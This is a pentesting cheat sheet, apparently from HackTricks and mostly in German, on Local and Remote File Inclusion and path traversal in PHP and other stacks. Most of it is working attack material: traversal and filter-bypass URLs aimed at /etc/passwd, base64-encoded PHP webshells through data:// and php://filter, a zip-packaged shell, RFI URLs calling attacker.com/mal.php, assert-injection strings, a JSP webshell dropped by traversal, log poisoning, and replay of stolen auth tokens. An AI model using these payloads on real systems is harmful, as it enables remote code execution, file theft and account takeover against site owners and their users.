# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Die Datei wird von einem entfernten Server geladen (Am besten: Du kannst den Code schreiben und der Server führt ihn aus). In PHP ist dies standardmäßig **deaktiviert** (**allow_url_include**).\
**Local File Inclusion (LFI):** Der Server lädt eine lokale Datei.

Die Schwachstelle entsteht, wenn der Benutzer auf irgendeine Weise die Datei kontrollieren kann, die vom Server geladen werden soll.

Anfällige **PHP-Funktionen**: require, require_once, include, include_once

Ein interessantes Tool, um diese Schwachstelle auszunutzen: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Ich habe mehrere \*nix LFI-Listen gemischt und weitere Pfade hinzugefügt, um diese hier zu erstellen:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Versuche auch, `/` durch `\` zu ersetzen\
Versuche auch, `../../../../../` hinzuzufügen

Eine Liste, die mehrere Techniken verwendet, um die Datei /etc/password zu finden (um zu prüfen, ob die Schwachstelle existiert), ist [hier](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt) zu finden

### **Windows**

Kombination verschiedener wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Versuche auch, `/` durch `\` zu ersetzen\
Versuche auch, `C:/` zu entfernen und `../../../../../` hinzuzufügen

Eine Liste, die mehrere Techniken verwendet, um die Datei /boot.ini zu finden (um zu prüfen, ob die Schwachstelle existiert), ist [hier](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt) zu finden

### **OS X**

Siehe die LFI-Liste von linux.

## Grundlegendes zu LFI und Bypässen

Alle Beispiele beziehen sich auf Local File Inclusion, können aber auch auf Remote File Inclusion angewendet werden (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences werden nicht rekursiv entfernt
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass das Anhängen weiterer Zeichen am Ende des bereitgestellten Strings (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Das ist **seit PHP 5.4 behoben**

### **Kodierung**

Sie können nicht-standardmäßige Kodierungen wie double URL encode (und andere) verwenden:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Aus vorhandenem Ordner

Möglicherweise überprüft das back-end den Ordnerpfad:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Dateisystemverzeichnisse auf einem Server erkunden

Das Dateisystem eines Servers kann rekursiv durchsucht werden, um Verzeichnisse (nicht nur Dateien) zu identifizieren, indem bestimmte Techniken angewendet werden. Dieser Prozess umfasst das Ermitteln der Verzeichnistiefe und das Überprüfen auf das Vorhandensein bestimmter Ordner. Nachfolgend eine detaillierte Methode, um dies zu erreichen:

1. **Verzeichnistiefe bestimmen:** Ermitteln Sie die Tiefe Ihres aktuellen Verzeichnisses, indem Sie erfolgreich die Datei `/etc/passwd` abrufen (anwendbar, wenn der Server Linux-basiert ist). Ein Beispiel-URL könnte wie folgt aufgebaut sein und eine Tiefe von drei anzeigen:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Auf Ordner prüfen:** Hänge den Namen des vermuteten Ordners (z. B. `private`) an die URL an und navigiere dann zurück zu `/etc/passwd`. Die zusätzliche Verzeichnisebene erfordert, die Tiefe um eins zu erhöhen:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpretieren Sie die Ergebnisse:** Die Antwort des Servers zeigt an, ob der Ordner existiert:
- **Fehler / Keine Ausgabe:** Der Ordner `private` existiert wahrscheinlich nicht am angegebenen Ort.
- **Inhalt von `/etc/passwd`:** Das Vorhandensein des Ordners `private` ist bestätigt.
4. **Rekursive Erkundung:** Gefundene Ordner können mit derselben Technik oder traditionellen Local File Inclusion (LFI)-Methoden weiter auf Unterverzeichnisse oder Dateien untersucht werden.

Um Verzeichnisse an anderen Stellen im Dateisystem zu untersuchen, passen Sie die payload entsprechend an. Zum Beispiel, um zu prüfen, ob `/var/www/` ein Verzeichnis `private` enthält (angenommen das aktuelle Verzeichnis befindet sich auf Tiefe 3), verwenden Sie:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation ist eine Methode, die verwendet wird, um Dateipfade in Webanwendungen zu manipulieren. Sie wird häufig benutzt, um auf eingeschränkte Dateien zuzugreifen, indem bestimmte Sicherheitsmaßnahmen umgangen werden, die zusätzliche Zeichen an das Ende von Dateipfaden anhängen. Das Ziel ist es, einen Dateipfad so zu konstruieren, dass er, nachdem die Sicherheitsmaßnahme ihn verändert hat, weiterhin auf die gewünschte Datei zeigt.

In PHP können verschiedene Darstellungen eines Dateipfads aufgrund der Natur des Dateisystems als äquivalent betrachtet werden. Zum Beispiel:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd` und `/etc/passwd/` werden alle als derselbe Pfad behandelt.
- Wenn die letzten 6 Zeichen `passwd` sind, verändert das Anhängen eines `/` (wodurch es zu `passwd/` wird) die angezielte Datei nicht.
- Ähnlich: Wenn `.php` an einen Dateipfad angehängt ist (z. B. `shellcode.php`), ändert das Anhängen von `/.` am Ende die aufgerufene Datei nicht.

Die folgenden Beispiele zeigen, wie man Path truncation nutzt, um auf `/etc/passwd` zuzugreifen, ein häufiges Ziel wegen seines sensiblen Inhalts (Benutzerkontoinformationen):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
In diesen Szenarien kann die benötigte Anzahl an Traversals etwa 2027 betragen, aber diese Zahl kann je nach Serverkonfiguration variieren.

- **Verwendung von Dot-Segmenten und zusätzlichen Zeichen**: Traversal-Sequenzen (`../`) kombiniert mit zusätzlichen Dot-Segmenten und Zeichen können verwendet werden, um im Dateisystem zu navigieren, wobei anhängende Strings durch den Server effektiv ignoriert werden.
- **Bestimmung der erforderlichen Anzahl von Traversals**: Durch Trial-and-Error kann man die genaue Anzahl von `../`-Sequenzen herausfinden, die benötigt wird, um zum Root-Verzeichnis und dann zu `/etc/passwd` zu gelangen, wobei sichergestellt wird, dass angehängte Strings (wie `.php`) neutralisiert werden, aber der gewünschte Pfad (`/etc/passwd`) erhalten bleibt.
- **Mit einem falschen Verzeichnis beginnen**: Es ist eine übliche Praxis, den Pfad mit einem nicht existierenden Verzeichnis (wie `a/`) zu beginnen. Diese Technik wird als Vorsichtsmaßnahme oder zur Erfüllung der Anforderungen der Pfad-Parsing-Logik des Servers verwendet.

Beim Einsatz von path truncation-Techniken ist es entscheidend, das Pfad-Parsing-Verhalten des Servers und die Struktur des Dateisystems zu verstehen. Jedes Szenario kann einen anderen Ansatz erfordern, und Tests sind oft notwendig, um die effektivste Methode zu finden.

**Diese Verwundbarkeit wurde in PHP 5.3 behoben.**

### **Filter-Bypass-Tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

In php ist das standardmäßig deaktiviert, weil **`allow_url_include`** **Off.** Es muss **On** sein, damit es funktioniert, und in diesem Fall könntest du eine PHP-Datei von deinem Server einbinden und RCE erhalten:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Wenn aus irgendeinem Grund **`allow_url_include`** **On** ist, aber PHP den Zugriff auf externe Webseiten **filtert**, [laut diesem Beitrag](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), kann man zum Beispiel das data-Protokoll mit base64 verwenden, um einen b64 PHP-Code zu decodieren und RCE zu erlangen:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> Im vorherigen Code wurde das abschließende `+.txt` hinzugefügt, weil der Angreifer eine Zeichenkette benötigte, die auf `.txt` endet. Dadurch endet die Zeichenkette damit und nach dem b64 decode wird dieser Teil nur Müll zurückgeben und der eigentliche PHP-Code eingebunden (und somit ausgeführt).

Ein weiteres Beispiel **das nicht das `php://`-Protokoll verwendet** wäre:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python Root-Element

In python, in einem code wie diesem:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Wenn der Benutzer einen **absoluten Pfad** an **`file_name`** übergibt, wird der **vorherige Pfad einfach entfernt**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Es ist das beabsichtigte Verhalten laut [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Wenn eine Komponente ein absoluter Pfad ist, werden alle vorherigen Komponenten verworfen und das Zusammenfügen wird ab der absoluten Pfadkomponente fortgesetzt.

## Java Verzeichnisse auflisten

Es scheint, dass, wenn du eine Path Traversal in Java hast und du **nach einem Verzeichnis fragst** statt nach einer Datei, **eine Auflistung des Verzeichnisses zurückgegeben wird**. Das wird in anderen Sprachen nicht passieren (afaik).

## Top 25 Parameter

Hier ist eine Liste der Top-25-Parameter, die für local file inclusion (LFI) Schwachstellen anfällig sein könnten (von [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI using PHP wrappers & protocols

### php://filter

PHP filters allow perform basic **Modifikationsoperationen an den Daten** bevor diese gelesen oder geschrieben werden. Es gibt 5 Kategorien von Filtern:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Entfernt Tags aus den Daten (alles zwischen den Zeichen "<" und ">" )
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Transformiert in eine andere Encoding(`convert.iconv.<input_enc>.<output_enc>`). Um die **Liste aller unterstützten Encodings** zu erhalten, führe in der Konsole aus: `iconv -l`

> [!WARNING]
> Durch Missbrauch des `convert.iconv.*` conversion filter kannst du **beliebigen Text erzeugen**, was nützlich sein kann, um beliebigen Text zu schreiben oder Funktionen wie include dazu zu bringen, beliebigen Text zu verarbeiten. Für mehr Infos siehe [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Komprimiert den Inhalt (nützlich beim exfiltrating großer Datenmengen)
- `zlib.inflate`: Dekomprimiert die Daten
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Veraltet
- `mdecrypt.*` : Veraltet
- Andere Filter
- Wenn man in php `var_dump(stream_get_filters());` ausführt, findet man ein paar **unerwartete Filter**:
- `consumed`
- `dechunk`: kehrt HTTP chunked encoding um
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Der Teil "php://filter" ist groß-/kleinschreibungsunabhängig

### Verwendung von php filters als oracle zum Lesen beliebiger Dateien

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) wird eine Technik vorgeschlagen, um eine lokale Datei zu lesen, ohne dass die Ausgabe vom Server zurückgegeben wird. Diese Technik basiert auf einer **boolean exfiltration der Datei (char by char) unter Verwendung von php filters als oracle**. Das ist möglich, weil php filters genutzt werden können, um einen Text so stark zu vergrößern, dass php eine Exception wirft.

Im Originalpost findet sich eine detaillierte Erklärung der Technik, hier eine kurze Zusammenfassung:

- Verwende den Codec **`UCS-4LE`**, um das führende Zeichen des Textes am Anfang zu belassen und die Länge des Strings exponentiell wachsen zu lassen.
- Das wird genutzt, um einen **Text zu erzeugen, der so groß ist, wenn der Anfangsbuchstabe korrekt erraten wurde**, dass php einen **Error** auslöst.
- Der **dechunk**-Filter **entfernt alles, wenn das erste Zeichen kein hexadezimaler Wert ist**, daher können wir feststellen, ob das erste Zeichen hex ist.
- Dies, kombiniert mit dem vorherigen Filter (und anderen Filtern abhängig vom geratenen Zeichen), erlaubt es uns, ein Zeichen am Anfang des Textes zu erraten, indem wir beobachten, wann genügend Transformationen vorgenommen wurden, sodass es kein hexadezimales Zeichen mehr ist. Denn ist es hex, löscht dechunk es nicht und die initiale Bombe verursacht den php-Error.
- Der Codec **convert.iconv.UNICODE.CP930** verschiebt jeden Buchstaben zum nächsten (also nach diesem Codec: a -> b). Das erlaubt zu erkennen, ob das erste Zeichen z. B. ein `a` ist, weil wenn wir diesen Codec sechsmal anwenden (a->b->c->d->e->f->g), das Zeichen nicht mehr hexadezimal ist, daher löscht dechunk es nicht und der php-Error wird ausgelöst, da er mit der initialen Bombe multipliziert.
- Mit anderen Transformationen wie **rot13** am Anfang ist es möglich, andere Zeichen wie n, o, p, q, r zu leak (und andere Codecs können verwendet werden, um andere Buchstaben in den Hex-Bereich zu verschieben).
- Wenn das Anfangszeichen eine Zahl ist, muss es base64-encodiert werden und man leak die ersten 2 Buchstaben, um die Zahl zu exfiltrieren.
- Das finale Problem ist zu sehen, **wie man mehr als das Anfangszeichen leak kann**. Durch die Verwendung von Order-/Memory-Filtern wie **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** ist es möglich, die Reihenfolge der Zeichen zu ändern und andere Zeichen des Textes an die erste Position zu bringen.
- Und um weitere Daten zu erhalten, ist die Idee, **2 Bytes Junk-Daten am Anfang zu generieren** mit **convert.iconv.UTF16.UTF16**, anschließend **UCS-4LE** anzuwenden, damit sie mit den nächsten 2 Bytes pivoten, und die Daten bis zu den Junk-Bytes zu löschen (das entfernt die ersten 2 Bytes des ursprünglichen Textes). Diesen Vorgang wiederholen, bis du das gewünschte Bit zum leak erreichst.

Im Beitrag wurde außerdem ein Tool vorgestellt, um dies automatisch durchzuführen: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Dieser Wrapper erlaubt den Zugriff auf File-Deskriptoren, die der Prozess geöffnet hat. Potenziell nützlich, um den Inhalt geöffneter Dateien zu exfiltrieren:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Du kannst auch **php://stdin, php://stdout and php://stderr** verwenden, um jeweils auf die **Dateideskriptoren 0, 1 und 2** zuzugreifen (ich weiß nicht, wie das in einem Angriff nützlich sein könnte)

### zip:// und rar://

Lade eine Zip- oder Rar-Datei mit einem PHPShell darin hoch und greife darauf zu.\
Um das rar-Protokoll ausnutzen zu können, **muss es speziell aktiviert werden**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Beachte, dass dieses Protokoll durch php-Konfigurationen **`allow_url_open`** und **`allow_url_include`** eingeschränkt ist

### expect://

Expect muss aktiviert sein. Du kannst damit Code ausführen:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Gib deinen Payload in den POST-Parametern an:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Eine `.phar`-Datei kann verwendet werden, um PHP-Code auszuführen, wenn eine Webanwendung Funktionen wie `include` zum Laden von Dateien nutzt. Der untenstehende PHP-Code zeigt, wie eine `.phar`-Datei erstellt wird:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Um die `.phar`-Datei zu kompilieren, sollte der folgende Befehl ausgeführt werden:
```bash
php --define phar.readonly=0 create_path.php
```
Bei Ausführung wird eine Datei namens `test.phar` erstellt, die potenziell dazu verwendet werden könnte, Local File Inclusion (LFI)-Schwachstellen auszunutzen.

Wenn das LFI nur Dateien liest, ohne den darin enthaltenen PHP-Code auszuführen — z. B. durch Funktionen wie `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()` oder `filesize()` — könnte ein Versuch unternommen werden, eine Deserialisierungs-Schwachstelle auszunutzen. Diese Schwachstelle steht im Zusammenhang mit dem Lesen von Dateien über das `phar`-Protokoll.

Für ein detailliertes Verständnis der Ausnutzung von Deserialisierungs-Schwachstellen im Kontext von `.phar`-Dateien, siehe das unten verlinkte Dokument:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Es war möglich, **jede beliebige von PHP gelesene Datei, die php filters unterstützt**, auszunutzen, um RCE zu erlangen. Die detaillierte Beschreibung kann [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Sehr kurze Zusammenfassung: Ein **3 byte overflow** im PHP-Heap wurde ausgenutzt, um die **Kette freier Chunks** einer bestimmten Größe zu verändern, um beliebig **in jede Adresse schreiben zu können**, daher wurde ein Hook hinzugefügt, um **`system`** aufzurufen.\
Es war möglich, Chunks bestimmter Größen zu allocieren, indem zusätzliche php filters missbraucht wurden.

### More protocols

Weitere mögliche[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Schreibt in den Speicher oder in eine temporäre Datei (nicht sicher, wie das in einem file inclusion attack nützlich sein kann)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Zugriff auf das lokale Dateisystem
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Zugriff auf HTTP(s)-URLs
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Zugriff auf FTP(s)-URLs
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Kompressions-Streams
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Findet Pfadnamen, die dem Muster entsprechen (gibt nichts Druckbares zurück, daher hier nicht wirklich nützlich)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio-Streams (Nicht nützlich, um beliebige Dateien zu lesen)

## LFI via PHP's 'assert'

Local File Inclusion (LFI)-Risiken in PHP sind besonders hoch, wenn die 'assert'-Funktion beteiligt ist, da sie Code innerhalb von Strings ausführen kann. Das ist besonders problematisch, wenn Eingaben mit Directory-Traversal-Zeichen wie ".." geprüft, aber nicht richtig bereinigt werden.

Zum Beispiel könnte PHP-Code so geschrieben sein, um Directory Traversal wie folgt zu verhindern:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Während dies darauf abzielt, traversal zu verhindern, schafft es unbeabsichtigt einen Vektor für code injection. Um dies auszunutzen, um Dateiinhalte zu lesen, könnte ein Angreifer Folgendes verwenden:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Ebenso kann man zum Ausführen beliebiger Systembefehle Folgendes verwenden:
```plaintext
' and die(system("id")) or '
```
Es ist wichtig, **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Diese Technik ist relevant in Fällen, in denen du den **file path** einer **PHP function** kontrollierst, die **access a file** wird, aber du den Inhalt der Datei nicht sehen wirst (wie ein einfacher Aufruf von **`file()`**) und der Inhalt nicht angezeigt wird.

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) wird erklärt, wie ein blind path traversal über PHP filter ausgenutzt werden kann, um den Inhalt einer Datei über ein error oracle zu exfiltrieren.

Zusammenfassend verwendet die Technik die **"UCS-4LE" encoding**, um den Inhalt einer Datei so **groß** zu machen, dass die **PHP function, die die Datei öffnet**, einen **error** auslöst.

Dann wird, um das erste Zeichen zu leak, der Filter **`dechunk`** zusammen mit anderen wie **base64** oder **rot13** verwendet, und schließlich werden die Filter **convert.iconv.UCS-4.UCS-4LE** und **convert.iconv.UTF16.UTF-16BE** benutzt, um andere chars an den Anfang zu setzen und sie zu leak.

**Functions that might be vulnerable**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Für technische Details siehe den erwähnten Post!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

When server-side code that ingests/uploads files builds the destination path using user-controlled data (e.g., a filename or URL) without canonicalising and validating it, `..` segments and absolute paths can escape the intended directory and cause an arbitrary file write. If you can place the payload under a web-exposed directory, you usually get unauthenticated RCE by dropping a webshell.

Typischer Exploit-Workflow:
- Identifiziere ein write primitive in einem endpoint oder background worker, das einen path/filename akzeptiert und content auf disk schreibt (z. B. message-driven ingestion, XML/JSON command handlers, ZIP extractors, etc.).
- Ermittle web-exponierte Verzeichnisse. Häufige Beispiele:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Erzeuge einen Traversal-Pfad, der aus dem vorgesehenen storage directory in das webroot ausbricht, und füge deinen webshell content ein.
- Rufe die dropped payload auf und führe Befehle aus.

Hinweise:
- Der verwundbare Dienst, der das Schreiben vornimmt, kann auf einem non-HTTP port lauschen (z. B. ein JMF XML listener auf TCP 4004). Das Hauptwebportal (anderer Port) wird später deine payload ausliefern.
- Auf Java-Stacks werden solche file writes oft mit einfacher `File`/`Paths`-Konkatenation implementiert. Fehlende canonicalisation/allow-listing ist der Kernfehler.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Härtungsmaßnahmen, die diese Klasse von Bugs verhindern:
- Auf einen kanonischen Pfad auflösen und sicherstellen, dass er ein Nachfahre eines allow-listed Basisverzeichnisses ist.
- Jeden Pfad ablehnen, der `..`, absolute Roots oder Laufwerksbuchstaben enthält; bevorzugt generierte Dateinamen.
- Den Writer als wenig privilegiertes Konto ausführen und Schreibverzeichnisse von den served roots trennen.

## Remote File Inclusion

Bereits zuvor erklärt, [**follow this link**](#remote-file-inclusion).

### Via Apache/Nginx log file

If the Apache or Nginx server is **vulnerable to LFI** inside the include function you could try to access to **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, set inside the **user agent** or inside a **GET parameter** a php shell like **`<?php system($_GET['c']); ?>`** and include that file

> [!WARNING]
> Beachte, dass **wenn du doppelte Anführungszeichen** für die Shell anstelle von **einfachen Anführungszeichen** verwendest, die doppelten Anführungszeichen in der Zeichenkette "_**quote;**_" umgewandelt werden, **PHP dort einen Fehler wirft** und **nichts weiter ausgeführt wird**.
>
> Stelle außerdem sicher, dass du die **payload korrekt schreibst**, sonst wirft PHP bei jedem Laden der Logdatei einen Fehler und du bekommst keine zweite Chance.

This could also be done in other logs but **be careful,** the code inside the logs could be URL encoded and this could destroy the Shell. The header **authorisation "basic"** contains "user:password" in Base64 and it is decoded inside the logs. The PHPShell could be inserted inside this header.\
Weitere mögliche Log-Pfade:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Zugriffs-Logs lesen, um GET-basierte auth tokens zu sammeln (token replay)

Viele Apps akzeptieren fälschlicherweise session/auth tokens über GET (z. B. AuthenticationToken, token, sid). Wenn du eine path traversal/LFI primitive zu den web server logs hast, kannst du diese tokens aus den access logs stehlen und sie replayen, um die authentication vollständig zu umgehen.

How-to:
- Use the traversal/LFI to read the web server access log. Common locations:
- /var/log/apache2/access.log, /var/log/httpd/access_log
- /var/log/nginx/access.log
- Some endpoints return file reads Base64-encoded. If so, decode locally and inspect the log lines.
- Grep for GET requests that include a token parameter and capture its value, then replay it against the application entry point.

Example flow (generic):
```http
GET /vuln/asset?name=..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log HTTP/1.1
Host: target
```
Dekodiere den Body, falls er Base64-codiert ist, und spiele dann ein aufgezeichnetes Token ab:
```http
GET /portalhome/?AuthenticationToken=<stolen_token> HTTP/1.1
Host: target
```
Hinweise:
- Tokens in URLs werden standardmäßig protokolliert; akzeptiere niemals bearer tokens via GET in Produktionssystemen.
- Wenn die App mehrere Token-Namen unterstützt, suche nach gängigen Schlüsseln wie AuthenticationToken, token, sid, access_token.
- Ersetze alle Tokens, die möglicherweise in den Logs leaked wurden.

### Über Email

**Sende eine Mail** an ein internes Konto (user@localhost), die deine PHP-Payload wie `<?php echo system($_REQUEST["cmd"]); ?>` enthält, und versuche, die Mail des Users einzubinden mit einem Pfad wie **`/var/mail/<USERNAME>`** oder **`/var/spool/mail/<USERNAME>`**

### Über /proc/\*/fd/\*

1. Lade viele shells hoch (zum Beispiel: 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), wobei $PID die PID des Prozesses ist (kann brute forced werden) und $FD der file descriptor ist (kann ebenfalls brute forced werden)

### Über /proc/self/environ

Wie eine Log-Datei, sende die Payload im User-Agent; sie wird in der /proc/self/environ-Datei reflektiert
```
